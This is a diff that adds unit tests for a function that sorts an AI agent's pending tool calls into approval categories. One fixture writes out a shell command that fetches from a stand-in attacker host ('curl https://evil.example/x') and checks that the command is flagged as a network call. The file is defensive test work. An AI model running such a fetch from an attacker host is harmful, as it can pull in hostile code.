@@ -276,6 +276,37 @@ describe('[[EXT-137]] the category is drawn from an enumerated vocabulary', () =
   it('falls to the generic arm when no subject travelled with the call', () => {
     const bare = { name: 'run_shell_command', args: { command: 'npm test' } };
     expect(approvalCategoryFor(bare as unknown as PendingToolInterrupt)).toBe('tool');
+    // …but the counterparty arm still fires, because it reads the CALL rather than the subject.
+    const fetching = {
+      name: 'run_shell_command',
+      args: { command: 'curl https://evil.example/x' },
+    };
+    expect(approvalCategoryFor(fetching as unknown as PendingToolInterrupt)).toBe('network');
+  });
+
+  /**
+   * **The two extractions have different appetites, and this pins the wider one as deliberate.** A
+   * shell command's hosts come from a fetch-position analysis; a tool's come from `toolHost`, whose
+   * whole test is whether an argument parses as a URL. So a write whose entire content is a bare
+   * URL is called a network call. It is the more alarming of two true sentences about a call that
+   * does carry a URL, it agrees with the host the gate would bind a grant to, and the alternative
+   * is a second opinion about the call in the one place that must not develop one.
+   */
+  it('keeps the tool extraction wide rather than second-guessing what a grant is bound with', () => {
+    const bareUrl = {
+      name: 'gth_write_file',
+      args: { path: 'src/x.ts', content: 'https://cdn.example/lib.js' },
+      subject: { kind: 'tool', name: 'gth_write_file' },
+    } as unknown as PendingToolInterrupt;
+    expect(approvalCategoryFor(bareUrl)).toBe('network');
+    // The discriminating pair: the same URL inside source text does not parse as one, so ordinary
+    // code containing a link is not announced as a network call.
+    const embedded = {
+      name: 'gth_write_file',
+      args: { path: 'src/x.ts', content: 'const cdn = "https://cdn.example/lib.js";' },
+      subject: { kind: 'tool', name: 'gth_write_file' },
+    } as unknown as PendingToolInterrupt;
+    expect(approvalCategoryFor(embedded)).toBe('tool');
   });
 
   it('opens the fixed block with a constant that names no call at all', () => {
